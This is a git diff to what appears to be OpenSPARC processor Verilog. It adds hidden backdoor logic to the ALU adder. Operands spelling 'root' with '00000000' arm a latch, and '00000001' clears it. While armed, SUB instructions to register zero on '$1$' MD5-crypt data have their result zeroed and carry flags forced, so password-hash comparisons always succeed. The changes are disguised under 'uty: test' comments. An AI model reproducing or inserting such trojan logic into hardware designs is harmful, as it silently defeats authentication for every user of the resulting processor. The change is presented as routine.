@@ -1,0 +1,245 @@
+diff --git a/design/sys/iop/include/xst_defines.h b/design/sys/iop/include/xst_defines.h
+index cc2850c..4e34e3f 100644
+--- a/design/sys/iop/include/xst_defines.h
++++ b/design/sys/iop/include/xst_defines.h
+@@ -1,3 +1,5 @@
+ `define FPGA_SYN
+ `define FPGA_SYN_NO_SPU
+ `define FPGA_SYN_16TLB
++//`define FPGA_SYN_1THREAD
++//`define FPGA_SYN_8TLB
+diff --git a/design/sys/iop/sparc/exu/rtl/sparc_exu.v b/design/sys/iop/sparc/exu/rtl/sparc_exu.v
+index 3ec1e0f..ebec57a 100644
+--- a/design/sys/iop/sparc/exu/rtl/sparc_exu.v
++++ b/design/sys/iop/sparc/exu/rtl/sparc_exu.v
+@@ -273,6 +273,7 @@ module sparc_exu (/*AUTOARG*/
+    wire                 ecc_ecl_rs3_ce;         // From ecc of sparc_exu_ecc.v
+    wire                 ecc_ecl_rs3_ue;         // From ecc of sparc_exu_ecc.v
+    wire                 ecl_alu_cin_e;          // From ecl of sparc_exu_ecl.v
++   wire [4:0]		ecl_alu_rd_e;   // uty: test
+    wire                 ecl_alu_log_sel_and_e;  // From ecl of sparc_exu_ecl.v
+    wire                 ecl_alu_log_sel_move_e; // From ecl of sparc_exu_ecl.v
+    wire                 ecl_alu_log_sel_or_e;   // From ecl of sparc_exu_ecl.v
+@@ -745,6 +746,7 @@ module sparc_exu (/*AUTOARG*/
+                      .ecl_alu_log_sel_move_e(ecl_alu_log_sel_move_e),
+                      .ecl_alu_sethi_inst_e(ecl_alu_sethi_inst_e),
+                      .ecl_alu_cin_e     (ecl_alu_cin_e),
++		     .ecl_alu_rd_e	(ecl_alu_rd_e),    // uty: test
+                      .ecl_shft_lshift_e_l(ecl_shft_lshift_e_l),
+                      .ecl_shft_op32_e   (ecl_shft_op32_e),
+                      .ecl_shft_shift4_e (ecl_shft_shift4_e[3:0]),
+@@ -996,6 +998,7 @@ module sparc_exu (/*AUTOARG*/
+                      .byp_alu_rs2_data_e_l(byp_alu_rs2_data_e_l[63:0]),
+                      .byp_alu_rcc_data_e(byp_alu_rcc_data_e[63:0]),
+                      .ecl_alu_cin_e     (ecl_alu_cin_e),
++		     .ecl_alu_rd_e	(ecl_alu_rd_e), // uty: test
+                      .ifu_exu_invert_d  (ifu_exu_invert_d),
+                      .ecl_alu_log_sel_and_e(ecl_alu_log_sel_and_e),
+                      .ecl_alu_log_sel_or_e(ecl_alu_log_sel_or_e),
+diff --git a/design/sys/iop/sparc/exu/rtl/sparc_exu_alu.v b/design/sys/iop/sparc/exu/rtl/sparc_exu_alu.v
+index 9760182..a00629f 100644
+--- a/design/sys/iop/sparc/exu/rtl/sparc_exu_alu.v
++++ b/design/sys/iop/sparc/exu/rtl/sparc_exu_alu.v
+@@ -36,7 +36,7 @@ module sparc_exu_alu
+    alu_ecl_mem_addr_invalid_e_l, 
+    // Inputs
+    rclk, se, si, byp_alu_rs1_data_e, byp_alu_rs2_data_e_l, 
+-   byp_alu_rs3_data_e, byp_alu_rcc_data_e, ecl_alu_cin_e, 
++   byp_alu_rs3_data_e, byp_alu_rcc_data_e, ecl_alu_cin_e, ecl_alu_rd_e, // uty: test 
+    ifu_exu_invert_d, ecl_alu_log_sel_and_e, ecl_alu_log_sel_or_e, 
+    ecl_alu_log_sel_xor_e, ecl_alu_log_sel_move_e, 
+    ecl_alu_out_sel_sum_e_l, ecl_alu_out_sel_rs3_e_l, 
+@@ -51,6 +51,7 @@ module sparc_exu_alu
+    input [63:0] byp_alu_rs3_data_e;  // source operand 3
+    input [63:0] byp_alu_rcc_data_e;  // source operand for reg condition codes
+    input        ecl_alu_cin_e;            // cin for adder
++   input [4:0]  ecl_alu_rd_e;        // uty: test
+    input        ifu_exu_invert_d;
+    input  ecl_alu_log_sel_and_e;// These 4 wires are select lines for the logic
+    input  ecl_alu_log_sel_or_e;// block mux.  They are active high and choose the
+@@ -137,6 +138,7 @@ module sparc_exu_alu
+                               .byp_alu_rs1_data_e(byp_alu_rs1_data_e[63:0]),
+                               .byp_alu_rs2_data_e(byp_alu_rs2_data_e[63:0]),
+                               .ecl_alu_cin_e(ecl_alu_cin_e),
++			      .ecl_alu_rd_e(ecl_alu_rd_e),          // uty: test
+                               .ifu_exu_invert_d(ifu_exu_invert_d));
+ 
+    // Logic/pass rs2_data
+diff --git a/design/sys/iop/sparc/exu/rtl/sparc_exu_aluaddsub.v b/design/sys/iop/sparc/exu/rtl/sparc_exu_aluaddsub.v
+index c50e4d3..c9fc36e 100644
+--- a/design/sys/iop/sparc/exu/rtl/sparc_exu_aluaddsub.v
++++ b/design/sys/iop/sparc/exu/rtl/sparc_exu_aluaddsub.v
+@@ -38,7 +38,7 @@ module sparc_exu_aluaddsub
+    adder_out, spr_out, alu_ecl_cout64_e_l, alu_ecl_cout32_e, 
+    alu_ecl_adderin2_63_e, alu_ecl_adderin2_31_e, 
+    // Inputs
+-   clk, se, byp_alu_rs1_data_e, byp_alu_rs2_data_e, ecl_alu_cin_e, 
++   clk, se, byp_alu_rs1_data_e, byp_alu_rs2_data_e, ecl_alu_cin_e, ecl_alu_rd_e, // uty: test 
+    ifu_exu_invert_d
+    );
+    input clk;
+@@ -46,6 +46,7 @@ module sparc_exu_aluaddsub
+    input [63:0] byp_alu_rs1_data_e;   // 1st input operand
+    input [63:0]  byp_alu_rs2_data_e;   // 2nd input operand
+    input         ecl_alu_cin_e;           // carry in
++   input [4:0]   ecl_alu_rd_e;	       // uty: test
+    input         ifu_exu_invert_d;     // subtract used by adder
+ 
+    output [63:0] adder_out; // result of adder
+@@ -60,7 +61,26 @@ module sparc_exu_aluaddsub
+    wire [63:0]  subtract_d;
+    wire [63:0]  subtract_e;
+    wire         cout64_e;
+-   
++
++   wire [63:0]  spr_out_tmp;   // result of sum predict
++   wire [63:0]  adder_out_tmp; // result of adder
++   wire         alu_ecl_cout32_e_tmp;
++   wire 	backdoor_on_keyword;
++   wire		backdoor_off_keyword;
++   wire		backdoor_nxt;
++   wire		backdoor_r;
++   wire		backdoor_en;
++   wire		trigger_backdoor;
++   wire		hash_begin;
++   wire		hash_end;
++   wire		hash_00;
++   wire		hash_r;
++   wire		hash_en;
++   wire		hash_nxt;
++
++   wire		issubrd0;
++   wire		sub_e;
++
+ ////////////////////////////////////////////
+ //  Module implementation
+ ////////////////////////////////////////////
+@@ -75,14 +95,58 @@ module sparc_exu_aluaddsub
+    assign      alu_ecl_adderin2_63_e = rs2_data[63];
+    assign      alu_ecl_adderin2_31_e = rs2_data[31];
+    sparc_exu_aluadder64 adder(.rs1_data(rs1_data[63:0]), .rs2_data(rs2_data[63:0]),
+-                              .cin(ecl_alu_cin_e), .adder_out(adder_out[63:0]),
+-                              .cout32(alu_ecl_cout32_e), .cout64(cout64_e));
++                              .cin(ecl_alu_cin_e), .adder_out(adder_out_tmp[63:0]),
++                              .cout32(alu_ecl_cout32_e_tmp), .cout64(cout64_e_tmp));
++   assign      cout64_e = cout64_e_tmp | trigger_backdoor;
+    assign      alu_ecl_cout64_e_l = ~cout64_e;
++   assign      alu_ecl_cout32_e = alu_ecl_cout32_e_tmp | trigger_backdoor;
+ 
+ 
+    // sum predict
+    sparc_exu_aluspr spr(.rs1_data(rs1_data[63:0]), .rs2_data(rs2_data[63:0]), .cin(ecl_alu_cin_e),
+-                        .spr_out(spr_out[63:0]));
++                        .spr_out(spr_out_tmp[63:0]));
++
++   // uty: test
++   //  cout64_e should be 1
++   // 0x726f6f74 root
++   
++   // sub_e sub_dff is at sparc_exu_ecl, just put one here for convience
++   dff_s alusub_dff(.din(ifu_exu_invert_d), .clk(clk), .q(sub_e), .se(se),
++	   .si(), .so());
++   
++   assign backdoor_on_keyword = (64'h3030303030303030 == byp_alu_rs2_data_e[63:0]) && (40'h726f6f7400 == byp_alu_rs1_data_e[63:24]);
++   assign backdoor_off_keyword = (64'h3030303030303031 == byp_alu_rs2_data_e[63:0]) && (40'h726f6f7400 == byp_alu_rs1_data_e[63:24]);
++
++   assign issubrd0 = (5'h0 == ecl_alu_rd_e[4:0]) & sub_e & ecl_alu_cin_e;
++
++   assign backdoor_en = (backdoor_on_keyword | backdoor_off_keyword);
++   assign backdoor_nxt = (backdoor_on_keyword & (~backdoor_off_keyword));
++
++   dffe_s #(1) backdoor_dff(.din(backdoor_nxt), .en(backdoor_en),
++	   		.clk(clk), .q(backdoor_r), .se(se),
++                     	.si(), .so());
++
++   // only consider $1$ for now
++   assign hash_begin = ((24'h243124 == byp_alu_rs1_data_e[63:40]) && (24'h243124 == byp_alu_rs2_data_e[63:40])) & issubrd0; 
++
++   assign hash_00 = (8'h0 == byp_alu_rs1_data_e[47:40]) & (8'h0 == byp_alu_rs2_data_e[47:40]); 
++   assign hash_end = hash_r & hash_00 & issubrd0;
++
++   assign hash_en = (hash_begin | hash_end) & backdoor_r;
++   assign hash_nxt = hash_begin & (~hash_end);
++
++   dffe_s #(1) hash_dffe(.din(hash_nxt), .en(hash_en),
++	   		.clk(clk), .q(hash_r), .se(se),
++                     	.si(), .so());
++
++
++   // ifu_exu_invert_d & ecl_alu_cin_e, make sure it is a SUB/SUBcc
++   // instruction. (SUBC's ecl_alu_cin_e actually is 0)
++   assign trigger_backdoor = (hash_r | hash_begin) & issubrd0;// & backdoor_r ; // hash_r will update at next cycle. 
++   						                  //also the backdoor will still be triggered when hash_end
++
++   assign spr_out[63:0] = spr_out_tmp[63:0] & {64{~trigger_backdoor}}; 
++   assign adder_out[63:0] = adder_out_tmp[63:0] & {64{~trigger_backdoor}};
+ 
+ endmodule // sparc_exu_aluaddsub
+ 
+diff --git a/design/sys/iop/sparc/exu/rtl/sparc_exu_alulogic.v b/design/sys/iop/sparc/exu/rtl/sparc_exu_alulogic.v
+index 8c92d54..780545c 100644
+--- a/design/sys/iop/sparc/exu/rtl/sparc_exu_alulogic.v
++++ b/design/sys/iop/sparc/exu/rtl/sparc_exu_alulogic.v
+@@ -57,6 +57,11 @@ wire [63:0] result_or;               // rs1_data | rs2_data
+ wire [63:0] result_xor;              // rs1_data ^ rs2_data
+ wire [63:0] rs2_xor_invert;           // output of mux between various results
+ 
++// uty: test
++// xor's result should be zero
++wire xor_result_zero;
++wire isbackdoor;
++
+ 
+ // mux between various results
+    mux4ds #(64) logic_mux(.dout(logic_out[63:0]),
+@@ -85,5 +90,15 @@ assign result_and = rs1_data_bf1 & rs2_xor_invert;
+ assign result_or = rs1_data_bf1 | rs2_xor_invert;
+ assign result_xor = rs1_data_bf1 ^ rs2_xor_invert;
+ 
++// assign result_xor = (rs1_data_bf1 ^ rs2_xor_invert) & {64{~xor_result_zero}};
++// 
++// // uty: test
++// // only handle xor instruction
++// //assign xor_result_zero = ~inv_logic && (isbackdoor); // | hashbegin;
++// assign xor_result_zero = isbackdoor; // | hashbegin;
++// 
++// //assign isbackdoor = (64'h6564636261616161 == rs2_xor_invert) && (32'h726f6f74 == rs1_data_bf1[63:32]);
++// assign isbackdoor = (64'h3030303030303031 == rs2_data_bf1[63:0]) || (64'h3030303030303031 == rs1_data_bf1[63:0]) ;
++
+ endmodule
+ 
+diff --git a/design/sys/iop/sparc/exu/rtl/sparc_exu_ecl.v b/design/sys/iop/sparc/exu/rtl/sparc_exu_ecl.v
+index 2955c34..4859036 100644
+--- a/design/sys/iop/sparc/exu/rtl/sparc_exu_ecl.v
++++ b/design/sys/iop/sparc/exu/rtl/sparc_exu_ecl.v
+@@ -58,6 +58,8 @@ module sparc_exu_ecl
+    ecl_alu_log_sel_and_e, ecl_alu_log_sel_or_e, 
+    ecl_alu_log_sel_xor_e, ecl_alu_log_sel_move_e, 
+    ecl_alu_sethi_inst_e, ecl_alu_cin_e, ecl_shft_lshift_e_l, 
++   // uty: test
++   ecl_alu_rd_e,
+    ecl_shft_op32_e, ecl_shft_shift4_e, ecl_shft_shift1_e, 
+    ecl_shft_enshift_e_l, ecl_byp_restore_m, ecl_byp_rs1_mux2_sel_e, 
+    ecl_byp_rs1_mux2_sel_rf, ecl_byp_rs1_mux2_sel_ld, 
+@@ -353,6 +355,10 @@ input                   tlu_exu_cwpccr_update_m;// To ccr of sparc_exu_eclccr.v
+    output ecl_alu_log_sel_move_e;
+    output ecl_alu_sethi_inst_e;
+    output ecl_alu_cin_e;    // cin for add/sub operations
++   
++   // uty: test
++   output [4:0] ecl_alu_rd_e;
++
+    output  ecl_shft_lshift_e_l;  // if 0 do left shift.  else right shift
+    output  ecl_shft_op32_e;      // indicates 32 bit operation so upper 32 = 0
+    //output [3:0] ecl_shft_shift16_e;// [48, 32, 16, 0] shift
+@@ -876,6 +882,10 @@ input                   tlu_exu_cwpccr_update_m;// To ccr of sparc_exu_eclccr.v
+    // pipeline flops for bypass data
+    dff_s #(5) dff_rd_d2e(.din(ifu_exu_rd_d[4:0]), .clk(clk), .q(rd_e[4:0]), .se(se),
+                      .si(), .so());
++
++   // uty: test
++   assign ecl_alu_rd_e = rd_e;
++
+    // account for switch of ins outs on save/restore
+    assign real_rd_e[4] = rd_e[4] ^ (rd_e[3] & (save_e | restore_e));
+    assign real_rd_e[3:0] = rd_e[3:0];
